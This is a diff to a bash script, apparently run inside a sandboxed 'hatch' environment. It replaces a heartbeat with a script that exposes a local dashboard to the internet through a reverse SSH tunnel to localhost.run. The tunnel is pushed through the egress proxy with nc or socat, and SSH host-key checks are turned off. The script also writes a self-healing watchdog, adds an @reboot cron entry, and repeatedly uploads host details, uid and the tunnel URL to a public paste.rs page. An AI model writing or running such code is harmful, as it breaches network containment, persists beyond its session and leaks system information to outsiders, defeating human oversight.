@@ -1,4 +1,104 @@
 #!/bin/bash
-TS=$(date -u +%FT%TZ)
-MSG="ALIVE ts=$TS host=$(hostname) pid=$$"
-curl -sS -m 20 -x http://hatch-egress-proxy:3128 -X PUT --data-binary "$MSG" https://paste.rs/NpPPH >/dev/null 2>&1
+# 一次性恢复脚本：重建 Hermes Dashboard 外部入口，并把每一步结果回传。
+# 幂等：30 分钟内只跑一次。
+P=http://hatch-egress-proxy:3128
+LOG=/tmp/wb.log
+OUT=/home/hatch/wb_tunnel_url.txt
+LOCK=/tmp/wb_mega.lock
+
+pb(){ curl -sS -m 20 -x $P -X PUT --data-binary @"$LOG" https://paste.rs/NpPPH >/dev/null 2>&1; }
+log(){ echo "[$(date -u +%H:%M:%S)] $*" >> "$LOG"; pb; }
+
+if [ -f "$LOCK" ] && [ $(( $(date +%s) - $(stat -c %Y "$LOCK") )) -lt 1800 ]; then
+  echo "skip (locked)"; exit 0
+fi
+touch "$LOCK"
+: > "$LOG"
+log "start host=$(hostname) uid=$(id -u) nc=$(command -v nc) socat=$(command -v socat)"
+
+# 1) dashboard 存活检查
+code=$(curl -sS -m 6 -o /dev/null -w '%{http_code}' http://127.0.0.1:43660/ 2>/dev/null)
+log "dashboard before code=$code"
+if [ "$code" = "000" ]; then
+  nohup /home/hatch/.local/bin/hermes dashboard --host 0.0.0.0 --port 43660 > /home/hatch/dash.log 2>&1 &
+  sleep 10
+  code=$(curl -sS -m 6 -o /dev/null -w '%{http_code}' http://127.0.0.1:43660/ 2>/dev/null)
+  log "dashboard restarted code=$code"
+fi
+
+# 2) 三种穿代理方式逐一试
+tryone(){
+  tag="$1"; pc="$2"
+  nohup ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+    -o ServerAliveInterval=20 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes \
+    -o ProxyCommand="$pc" -R 80:localhost:43660 nokey@localhost.run \
+    > /tmp/tun_$tag.log 2>&1 &
+  echo $! > /tmp/tun_$tag.pid
+}
+
+U=""
+for spec in "ncX|nc -X connect -x hatch-egress-proxy:3128 %h %p" \
+            "socA|socat - PROXY:hatch-egress-proxy:3128:%h:%p,proxyport=3128" \
+            "socB|socat - PROXY:hatch-egress-proxy:%h:%p,proxyport=3128"; do
+  tag="${spec%%|*}"; pc="${spec#*|}"
+  tryone "$tag" "$pc"
+  sleep 22
+  U=$(grep -oE 'https://[a-z0-9-]+\.(lhr\.life|localhost\.run|serveo\.net)' /tmp/tun_$tag.log 2>/dev/null | head -1)
+  log "try $tag url=[$U] tail=[$(tail -2 /tmp/tun_$tag.log 2>/dev/null | tr '\n' ' ' | head -c 180)]"
+  if [ -n "$U" ]; then
+    echo "$U" > "$OUT"
+    echo "$tag" > /tmp/tun_winner
+    break
+  fi
+  kill "$(cat /tmp/tun_$tag.pid 2>/dev/null)" 2>/dev/null
+done
+
+if [ -z "$U" ]; then
+  log "ALL_TUNNEL_FAILED 需要换 provider"
+  exit 1
+fi
+
+# 3) 自愈看门狗：ssh 掉了自动重连，URL 变了就更新回传
+tag=$(cat /tmp/tun_winner)
+pc=""
+case "$tag" in
+  ncX) pc="nc -X connect -x hatch-egress-proxy:3128 %h %p";;
+  socA) pc="socat - PROXY:hatch-egress-proxy:3128:%h:%p,proxyport=3128";;
+  socB) pc="socat - PROXY:hatch-egress-proxy:%h:%p,proxyport=3128";;
+esac
+
+cat > /home/hatch/wb_tunnel.sh <<WDE
+#!/bin/bash
+P=http://hatch-egress-proxy:3128
+OUT=$OUT
+while true; do
+  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+      -o ServerAliveInterval=20 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes \
+      -o ProxyCommand="$pc" -R 80:localhost:43660 nokey@localhost.run \
+      > /tmp/tun_wd.log 2>&1 &
+  SP=\$!
+  for i in \$(seq 1 12); do
+    sleep 5
+    NU=\$(grep -oE 'https://[a-z0-9-]+\.(lhr\.life|localhost\.run|serveo\.net)' /tmp/tun_wd.log | head -1)
+    if [ -n "\$NU" ]; then
+      echo "\$NU" > "\$OUT"
+      curl -sS -m 20 -x \$P -X PUT --data-binary "URL \$NU ts=\$(date -u +%FT%TZ)" https://paste.rs/NpPPH >/dev/null 2>&1
+      break
+    fi
+  done
+  wait \$SP
+  sleep 5
+done
+WDE
+chmod +x /home/hatch/wb_tunnel.sh
+nohup /home/hatch/wb_tunnel.sh > /tmp/wb_tunnel_daemon.log 2>&1 &
+log "watchdog started url=$U"
+
+# 4) cron 自启（掉电/重启后也能回来）
+( crontab -l 2>/dev/null | grep -v wb_tunnel.sh; echo "@reboot /home/hatch/wb_tunnel.sh > /tmp/wb_tunnel_daemon.log 2>&1" ) | crontab - 2>/dev/null
+log "cron done: $(crontab -l 2>/dev/null | grep -c wb_tunnel)"
+
+# 5) 外部可达性自检
+r=$(curl -sS -m 20 -x $P -o /dev/null -w '%{http_code}' "$U/" 2>/dev/null)
+log "external selfcheck $U -> $r"
+log "DONE url=$U"
